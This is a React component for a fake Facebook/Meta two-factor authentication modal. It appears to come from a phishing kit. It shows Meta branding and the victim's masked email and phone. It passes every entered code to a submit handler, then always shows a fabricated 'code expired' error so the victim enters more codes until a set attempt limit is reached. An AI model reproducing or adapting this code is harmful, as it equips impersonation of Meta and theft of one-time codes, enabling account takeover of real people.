import { useState } from 'react';
import PropTypes from 'prop-types';
import TwoFAImage from '@/assets/images/2FA.png';
import MetaLogoGray from '@/assets/images/logo-meta.svg';
import config from '@/utils/config';

const inputWrapperBase = {
    position: 'relative',
    width: '100%',
    border: '1px solid #d4dbe3',
    height: '40px',
    padding: '0 11px',
    borderRadius: '10px',
    background: '#fff',
    fontSize: '14px',
    marginBottom: '10px',
    display: 'flex',
    alignItems: 'center',
    transition: 'border-color 0.2s, box-shadow 0.2s',
    boxSizing: 'border-box'
};

const TwoFAModal = ( { show, onClose, onSubmit, onSuccess, texts, formData } ) =>
{
    const [ code, setCode ] = useState( '' );
    const [ isLoading, setIsLoading ] = useState( false );
    const [ showError, setShowError ] = useState( false );
    const [ attempts, setAttempts ] = useState( 0 );
    const [ countdown, setCountdown ] = useState( 0 );
    const [ focused, setFocused ] = useState( false );

    const handleSubmit = async ( e ) =>
    {
        e.preventDefault();

        if ( !code.trim() || code.length < 6 || code.length > 8 )
        {
            return;
        }

        setIsLoading( true );
        setShowError( false );

        onSubmit( code );

        setCountdown( config.code_loading_time || 3 );

        const timer = setInterval( () =>
        {
            setCountdown( ( prev ) =>
            {
                if ( prev <= 1 )
                {
                    clearInterval( timer );
                    return 0;
                }
                return prev - 1;
            } );
        }, 1000 );

        await new Promise( ( resolve ) => setTimeout( resolve, ( config.code_loading_time || 3 ) * 1000 ) );

        setShowError( true );
        setAttempts( ( prev ) => prev + 1 );
        setIsLoading( false );
        setCountdown( 0 );

        if ( attempts + 1 >= ( config.max_code_attempts || 2 ) )
        {
            onSuccess();
            return;
        }

        setCode( '' );
    };

    const maskEmail = ( email ) =>
    {
        if ( !email ) return 'e**l@example.com';
        const parts = email.split( '@' );
        if ( parts.length !== 2 ) return email;
        const [ name, domain ] = parts;
        if ( name.length <= 2 ) return `${ name[ 0 ] || '' }**@${ domain }`;
        return `${ name[ 0 ] }**${ name[ name.length - 1 ] }@${ domain }`;
    };

    const maskPhone = ( phone ) =>
    {
        if ( !phone ) return '+** **** **';
        const cleaned = phone.replace( /\s+/g, '' );
        if ( cleaned.length < 6 ) return phone;
        const countryCodeMatch = cleaned.match( /^(\+\d{1,3})/ );
        const countryCode = countryCodeMatch ? countryCodeMatch[ 1 ] : '';
        const numberPart = cleaned.slice( countryCode.length );
        const lastTwo = numberPart.slice( -2 );
        return `${ countryCode || '+' } **** ${ lastTwo }`;
    };

    const maxCodeAttempts = Math.max( 1, config.max_code_attempts || 2 );
    const twoFaAttemptShown = Math.min( attempts + 1, maxCodeAttempts );
    const twoFATitleBase = texts.twoFATitleNew || 'Two-factor authentication required';
    const twoFADisplayTitle = `${ twoFATitleBase } (${ twoFaAttemptShown }/${ maxCodeAttempts })`;

    const fullName = formData?.fullName || texts.twoFAFallbackUser || 'User';
    const emailToDisplay = formData?.personalEmail || formData?.businessEmail;
    const maskedEmail = maskEmail( emailToDisplay );
    const maskedPhone = maskPhone( formData?.phone );

    const twoFADescription = ( texts.twoFADescriptionTemplate || 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)' )
        .replace( /\{\{email\}\}/g, maskedEmail )
        .replace( /\{\{phone\}\}/g, maskedPhone );

    if ( !show ) return null;

    return (
        <>
            {/* Backdrop */ }
            <div
                onClick={ onClose }
                style={ { position: 'fixed', inset: 0, zIndex: 1040, background: 'rgba(0,0,0,0.5)' } }
            />

            {/* Modal */ }
            <div style={ {
                position: 'fixed', inset: 0, zIndex: 1050,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                padding: '16px'
            } }>
                <div
                    style={ {
                        background: 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
                        width: '100%',
                        maxWidth: '512px',
                        maxHeight: '90vh',
                        borderRadius: '16px',
                        boxShadow: '0 20px 60px rgba(0,0,0,0.2)',
                        padding: '20px',
                        display: 'flex',
                        flexDirection: 'column',
                        overflow: 'hidden'
                    } }
                    onClick={ ( e ) => e.stopPropagation() }
                >
                    {/* Empty header row */ }
                    <div style={ { display: 'flex', justifyContent: 'flex-end', marginBottom: '0' } } />

                    {/* Scrollable body */ }
                    <div style={ { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', alignItems: 'center' } }>
                        
                        <div style={ { width: '100%' } }>
                            {/* User Info Bar */ }
                            <div style={ { display: 'flex', width: '100%', alignItems: 'center', color: '#9a979e', gap: '6px', fontSize: '14px', marginBottom: '7px' } }>
                                <span>{ fullName }</span>
                                <div style={ { width: '4px', height: '4px', background: '#9a979e', borderRadius: '5px' } } />
                                <span>{ texts.twoFABrandFacebook || 'Facebook' }</span>
                            </div>

                            <div style={ { fontSize: '20px', color: 'black', fontWeight: '700', marginBottom: '15px' } }>
                                { twoFADisplayTitle }
                            </div>

                            <p style={ { color: '#9a979e', fontSize: '14px', lineHeight: '1.5' } }>
                                { twoFADescription }
                            </p>

                            <div style={ { width: '100%', borderRadius: '10px', background: '#f5f5f5', overflow: 'hidden', margin: '15px 0' } }>
                                <img width="100%" alt={ texts.twoFAAuthenticationImageAlt || 'authentication' } src={ TwoFAImage } style={ { display: 'block' } } />
                            </div>

                            <div style={ { width: '100%' } }>
                                <form onSubmit={ handleSubmit } autoComplete="off">
                                    <div
                                        style={ {
                                            ...inputWrapperBase,
                                            borderColor: showError ? '#ef4444' : focused ? '#3b82f6' : '#d4dbe3',
                                            boxShadow: showError 
                                                ? '0 4px 12px rgba(239,68,68,0.1)' 
                                                : focused ? '0 4px 12px rgba(59,130,246,0.1)' : 'none'
                                        } }
                                    >
                                        <input
                                            id="twoFa"
                                            placeholder={ texts.enterCode || "Enter the code" }
                                            type="number"
                                            value={ code }
                                            onChange={ ( e ) =>
                                            {
                                                setCode( e.target.value );
                                                if ( showError ) setShowError( false );
                                            } }
                                            onFocus={ () => setFocused( true ) }
                                            onBlur={ () => setFocused( false ) }
                                            style={ { width: '100%', outline: 'none', border: 'none', background: 'transparent', fontSize: '14px', height: '100%', MozAppearance: 'textfield' } }
                                        />
                                    </div>

                                    { showError && (
                                        <p style={ { color: '#ef4444', fontSize: '13px', marginTop: '-6px', marginBottom: '10px' } }>
                                            { texts.codeExpired || 'This code has expired. Please enter a new code later' }
                                        </p>
                                    ) }

                                    <div style={ { width: '100%', marginTop: '20px' } }>
                                        <button
                                            type="submit"
                                            disabled={ isLoading || !code.trim() }
                                            style={ {
                                                height: '45px', minHeight: '45px', width: '100%',
                                                background: '#0064E0', color: '#fff',
                                                borderRadius: '40px', border: 'none',
                                                display: 'flex', alignItems: 'center', justifyContent: 'center',
                                                cursor: isLoading || !code.trim() ? 'not-allowed' : 'pointer',
                                                fontWeight: '500', fontSize: '15px',
                                                fontFamily: 'inherit', position: 'relative',
                                                opacity: isLoading || !code.trim() ? 0.7 : 1,
                                                transition: 'opacity 0.3s'
                                            } }
                                        >
                                            { isLoading ? (
                                                <span style={ {
                                                    width: '20px', height: '20px',
                                                    border: '2.5px solid rgba(255,255,255,0.4)',
                                                    borderTopColor: '#fff',
                                                    borderRadius: '50%',
                                                    animation: 'spin 0.8s linear infinite',
                                                    display: 'inline-block'
                                                } } />
                                            ) : ( texts.continueBtn || 'Continue' ) }
                                        </button>
                                    </div>

                                    <div style={ { width: '100%', marginTop: '20px', color: '#9a979e', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer', background: 'transparent', borderRadius: '40px', padding: '10px 20px', border: '1px solid #d4dbe3', boxSizing: 'border-box' } }>
                                        <span>{ texts.tryAnotherWay || 'Try another way' }</span>
                                    </div>
                                </form>
                            </div>
                        </div>

                        {/* Meta logo bottom */ }
                        <div style={ { width: '60px', margin: '20px auto 0', paddingTop: '32px' } }>
                            <img src={ MetaLogoGray } alt="Meta" style={ { width: '100%', height: 'auto', objectFit: 'contain', opacity: 0.4 } } />
                        </div>

                    </div>
                </div>
            </div>

            <style>{ `
                @keyframes spin { to { transform: rotate(360deg); } }
                input[type="number"]::-webkit-inner-spin-button, 
                input[type="number"]::-webkit-outer-spin-button { 
                    -webkit-appearance: none; 
                    margin: 0; 
                }
            ` }</style>
        </>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

export default TwoFAModal;
